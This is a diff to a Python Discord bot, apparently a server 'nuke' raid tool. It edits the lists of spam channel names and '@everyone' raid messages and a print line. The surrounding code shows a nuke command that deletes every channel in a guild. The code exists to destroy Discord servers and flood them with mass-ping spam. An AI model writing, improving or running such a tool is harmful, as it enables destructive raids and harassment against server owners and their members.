@@ -7,8 +7,8 @@ token = "PUT TOKEN HERE"
 
 # -----------------------------------------------------
 
-SPAM_CHANNEL = ["misspoken on top", "nuked by misspoken", "lmaooo", "ran by misspoken"]
-SPAM_MESSAGE = ["@everyone RAIDED BY MISSPOKEN! https://discord.gg/E6pQteTBYp", "@everyone Misspoken owns you! https://discord.gg/E6pQteTBYp", "@everyone Ran by Misspoken https://discord.gg/E6pQteTBYp"]
+SPAM_CHANNEL = ["misspoken on top", "nuked by misspoken", "fear misspoken", "ran by misspoken"]
+SPAM_MESSAGE = ["@everyone wizzed by misspoken!", "@everyone misspoken owns you", "@everyone ran by misspoken"]
 @client.command()
 async def nuke(ctx):
 
@@ -25,7 +25,7 @@ async def nuke(ctx):
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(f"{channel.name} was deleted :D")
+        print(f"{channel.name} was deleted.")
       except:
         print(f"{channel.name} was not deleted, maybe because the channel is a community channel")
         
